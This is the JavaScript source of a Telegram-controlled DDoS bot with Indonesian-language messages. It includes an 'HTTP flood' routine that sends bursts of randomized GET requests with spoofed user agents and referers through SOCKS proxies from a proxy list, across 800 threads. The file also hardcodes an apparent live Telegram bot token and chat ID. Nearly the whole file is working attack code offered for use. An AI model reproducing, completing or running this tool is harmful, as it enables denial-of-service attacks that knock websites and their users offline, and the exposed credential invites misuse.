 const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const socks = require('socks');
const net = require('net');
const tls = require('tls');
const crypto = require('crypto');
const fs = require('fs');
const TELEGRAM_BOT_TOKEN = '7901822583:AAE5HS_OwFcRf6iMUHNfQK9zkP_cIwb7TxM';
const TELEGRAM_CHAT_ID = '6471584924';
const LOGIN_PASSWORD = '👰👰👰';
const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: true });
let mode = "cc";
let target = "";
let path = "/";
let port = 80;
let protocol = "http";
let proxy_ver = "5";
let brute = false;
let out_file = "proxy.txt";
let thread_num = 800;
let data = "";
let cookies = "";
let proxies = [];
let attackRunning = false;
const days = ['Minggu', 'Senin', 'Selasa', 'Rabu', 'Kamis', 'Jumat', 'Sabtu'];
const months = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember'];
const YOUTUBE_VIDEO_URL = "https://youtu.be/gz1GLVdIBFo?si=3d94avshO75F334D";
const acceptall = [
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
    "Accept-Encoding: gzip, deflate\r\n",
    "Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
    "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
    "Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
    "Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
    "Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
    "Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n,",
    "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n",
    "Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
    "Accept: text/html, application/xhtml+xml",
    "Accept-Language: en-US,en;q=0.5\r\n",
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
    "Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n"
];
const referers = [
    "https://www.google.com/search?q=",
    "https://check-host.net/",
    "https://www.facebook.com/",
    "https://www.youtube.com/",
    "https://www.fbi.com/",
    "https://www.bing.com/search?q=",
    "https://r.search.yahoo.com/",
    "https://www.cia.gov/index.html",
    "https://vk.com/profile.php?redirect=",
    "https://www.usatoday.com/search/results?q=",
    "https://help.baidu.com/searchResult?keywords=",
    "https://steamcommunity.com/market/search?q=",
    "https://www.ted.com/search?q=",
    "https://play.google.com/store/search?q=",
    "https://www.qwant.com/search?q=",
    "https://soda.demo.socrata.com/resource/4tka-6guv.json?$q=",
    "https://www.google.ad/search?q=",
    "https://www.google.ae/search?q=",
    "https://www.google.com.af/search?q=",
    "https://www.google.com.ag/search?q=",
    "https://www.google.com.ai/search?q=",
    "https://www.google.al/search?q=",
    "https://www.google.am/search?q=",
    "https://www.google.co.ao/search?q=",
];
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    const now = new Date();
    const dayName = days[now.getDay()];
    const monthName = months[now.getMonth()];
    const dateTime = `${dayName}, ${now.getDate()} ${monthName} ${now.getFullYear()} ${now.getHours()}:${now.getMinutes()}:${now.getSeconds()}`;
    
    bot.sendMessage(chatId, `╔══════════════════⊱
║  Bot DDoS Attack  
╚══════════════════⊱

Tanggal: ${dateTime}
YouTube: ${YOUTUBE_VIDEO_URL}

Perintah yang tersedia:
/login - Masuk dengan password
/attack - Mulai serangan DDoS
/stop - Hentikan serangan
/status - Status serangan
/clear - Hapus pesan grup
/donasi - Tampilkan link donasi
/info - Informasi bot`);
});

bot.onText(/\/login (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const password = match[1];
    
    if (password === LOGIN_PASSWORD) {
        bot.sendMessage(chatId, "Login berhasil! Sekarang Anda dapat menggunakan perintah /attack");
    } else {
        bot.sendMessage(chatId, "Password salah!");
    }
});

bot.onText(/\/attack/, (msg) => {
    const chatId = msg.chat.id;
    
    if (attackRunning) {
        bot.sendMessage(chatId, "Serangan sudah berjalan!");
        return;
    }
    bot.sendMessage(chatId, "Memulai serangan DDoS...");
    attackRunning = true;
    startAttack();
});

bot.onText(/\/stop/, (msg) => {
    const chatId = msg.chat.id;
    
    if (!attackRunning) {
        bot.sendMessage(chatId, "Tidak ada serangan yang berjalan!");
        return;
    }
    
    bot.sendMessage(chatId, "Menghentikan serangan DDoS...");
    attackRunning = false;
});

bot.onText(/\/status/, (msg) => {
    const chatId = msg.chat.id;
    const now = new Date();
    const dayName = days[now.getDay()];
    const monthName = months[now.getMonth()];
    const dateTime = `${dayName}, ${now.getDate()} ${monthName} ${now.getFullYear()} ${now.getHours()}:${now.getMinutes()}:${now.getSeconds()}`;
    
    const statusMessage = attackRunning ? 
        `Serangan sedang berjalan\nMode: ${mode}\nTarget: ${target}\nThreads: ${thread_num}` :
        "Tidak ada serangan yang berjalan";
    
    bot.sendMessage(chatId, `╔══════════════════⊱
║  Status Serangan  
╚══════════════════⊱
${statusMessage}
Tanggal: ${dateTime}
YouTube: ${YOUTUBE_VIDEO_URL}`);
});

bot.onText(/\/donasi/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, "Terima kasih atas donasinya!\nLink donasi: [MASUKKAN_LINK_DONASI_ANDA]");
});

bot.onText(/\/info/, (msg) => {
    const chatId = msg.chat.id;
    const now = new Date();
    const dayName = days[now.getDay()];
    const monthName = months[now.getMonth()];
    const dateTime = `${dayName}, ${now.getDate()} ${monthName} ${now.getFullYear()} ${now.getHours()}:${now.getMinutes()}:${now.getSeconds()}`;
    
    bot.sendMessage(chatId, `╔══════════════════⊱
║  Informasi Bot  
╚══════════════════⊱

Bot DDoS Attack via Telegram
Versi: 1.0

Tanggal: ${dateTime}
YouTube: ${YOUTUBE_VIDEO_URL}

Perintah:
/start - Mulai bot
/login - Masuk dengan password
/attack - Mulai serangan
/stop - Hentikan serangan
/status - Status serangan
/donasi - Link donasi
/clear - Hapus pesan grup`);
});

// Helper functions
function getRandomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function randomChoice(array) {
    return array[getRandomInt(0, array.length - 1)];
}

function getuseragent() {
    const platform = randomChoice(['Macintosh', 'Windows', 'X11']);
    let os = '';
    
    if (platform === 'Macintosh') {
        os = randomChoice(['68K', 'PPC', 'Intel Mac OS X']);
    } else if (platform === 'Windows') {
        os = randomChoice(['Win3.11', 'WinNT3.51', 'WinNT4.0', 'Windows NT 5.0', 'Windows NT 5.1', 'Windows NT 5.2', 'Windows NT 6.0', 'Windows NT 6.1', 'Windows NT 6.2', 'Win 9x 4.90', 'WindowsCE', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows NT 10.0; Win64; x64']);
    } else if (platform === 'X11') {
        os = randomChoice(['Linux i686', 'Linux x86_64']);
    }
    
    const browser = randomChoice(['chrome', 'firefox', 'ie']);
    
    if (browser === 'chrome') {
        const webkit = getRandomInt(500, 599);
        const version = `${getRandomInt(0, 99)}.0${getRandomInt(0, 9999)}.${getRandomInt(0, 999)}`;
        return `Mozilla/5.0 (${os}) AppleWebKit/${webkit}.0 (KHTML, like Gecko) Chrome/${version} Safari/${webkit}`;
    } else if (browser === 'firefox') {
        const currentYear = new Date().getFullYear();
        const year = getRandomInt(2020, currentYear);
        let month = getRandomInt(1, 12);
        month = month < 10 ? `0${month}` : month;
        let day = getRandomInt(1, 30);
        day = day < 10 ? `0${day}` : day;
        const gecko = `${year}${month}${day}`;
        const version = `${getRandomInt(1, 72)}.0`;
        return `Mozilla/5.0 (${os}; rv:${version}) Gecko/${gecko} Firefox/${version}`;
    } else if (browser === 'ie') {
        const version = `${getRandomInt(1, 99)}.0`;
        const engine = `${getRandomInt(1, 99)}.0`;
        const option = randomChoice([true, false]);
        let token = '';
        if (option) {
            token = randomChoice(['.NET CLR', 'SV1', 'Tablet PC', 'Win64; IA64', 'Win64; x64', 'WOW64']) + '; ';
        }
        return `Mozilla/5.0 (compatible; MSIE ${version}; ${os}; ${token}Trident/${engine})`;
    }
}

function parseUrl(original_url) {
    original_url = original_url.trim();
    let url = "";
    path = "/";
    port = 80;
    protocol = "http";
    
    if (original_url.startsWith("http://")) {
        url = original_url.substring(7);
    } else if (original_url.startsWith("https://")) {
        url = original_url.substring(8);
        protocol = "https";
    } else {
        bot.sendMessage(TELEGRAM_CHAT_ID, "> URL tidak valid.");
        return false;
    }
    
    const tmp = url.split("/");
    const website = tmp[0];
    const check = website.split(":");
    
    if (check.length !== 1) {
        port = parseInt(check[1]);
    } else {
        if (protocol === "https") {
            port = 443;
        }
    }
    
    target = check[0];
    
    if (tmp.length > 1) {
        path = url.replace(website, "");
    }
    
    return true;
}

function genReqHeader(method) {
    let header = "";
    
    if (method === "get" || method === "head") {
        let connection = "Connection: Keep-Alive\r\n";
        if (cookies !== "") {
            connection += `Cookies: ${cookies}\r\n`;
        }
        const accept = randomChoice(acceptall);
        const referer = `Referer: ${randomChoice(referers)}${target}${path}\r\n`;
        const useragent = `User-Agent: ${getuseragent()}\r\n`;
        header = referer + useragent + accept + connection + "\r\n";
    } else if (method === "post") {
        const post_host = `POST ${path} HTTP/1.1\r\nHost: ${target}\r\n`;
        const content = "Content-Type: application/x-www-form-urlencoded\r\nX-requested-with:XMLHttpRequest\r\n";
        const refer = `Referer: http://${target}${path}\r\n`;
        const user_agent = `User-Agent: ${getuseragent()}\r\n`;
        const accept = randomChoice(acceptall);
        
        if (data === "") {
            data = crypto.randomBytes(16).toString('hex');
        }
        
        let length = `Content-Length: ${data.length} \r\nConnection: Keep-Alive\r\n`;
        if (cookies !== "") {
            length += `Cookies: ${cookies}\r\n`;
        }
        header = post_host + accept + refer + content + user_agent + length + "\n" + data + "\r\n\r\n";
    }
    
    return header;
}
function cc(event, proxy_type) {
    const header = genReqHeader("get");
    const proxy = randomChoice(proxies).trim().split(":");
    const add = path.includes("?") ? "&" : "?";
    
    while (attackRunning) {
        try {
            const options = {
                proxy: {
                    host: proxy[0],
                    port: parseInt(proxy[1]),
                    type: proxy_type === 4 ? 4 : (proxy_type === 5 ? 5 : 0)
                },
                target: {
                    host: target,
                    port: port
                },
                command: 'connect'
            };
            
            socks.createConnection(options, (err, socket, info) => {
                if (err) {
                    return;
                }
                
                if (protocol === "https") {
                    const tlsSocket = tls.connect({
                        socket: socket,
                        host: target
                    }, () => {
                        for (let i = 0; i < 100 && attackRunning; i++) {
                            const get_host = `GET ${path}${add}${getRandomInt(0, 271400281257)} HTTP/1.1\r\nHost: ${target}\r\n`;
                            const request = get_host + header;
                            socket.write(request);
                        }
                        tlsSocket.end();
                    });
                    
                    tlsSocket.on('error', () => {});
                } else {
                    for (let i = 0; i < 100 && attackRunning; i++) {
                        const get_host = `GET ${path}${add}${getRandomInt(0, 271400281257)} HTTP/1.1\r\nHost: ${target}\r\n`;
                        const request = get_host + header;
                        socket.write(request);
                    }
                    socket.end();
                }
            });
        } catch (err) {
        }
    }
}

function startAttack() {
    try {
        proxies = fs.readFileSync(out_file, 'utf-8').split('\n');
    } catch (err) {
        bot.sendMessage(TELEGRAM_CHAT_ID, "Gagal memuat file proxy!");
        attackRunning = false;
        return;
    }
    
    if (proxies.length === 0) {
        bot.sendMessage(TELEGRAM_CHAT_ID, "Tidak ada proxy yang tersedia!");
        attackRunning = false;
        return;
    }
    
    bot.sendMessage(TELEGRAM_CHAT_ID, `Memulai serangan dengan ${proxies.length} proxy...`);
    
    // Start attack threads
    for (let i = 0; i < thread_num; i++) {
        setTimeout(() => {
            if (attackRunning) {
                cc(null, proxy_ver === "4" ? 4 : (proxy_ver === "5" ? 5 : 0));
            }
        }, 0);
    }
}

console.log("Bot is running...");
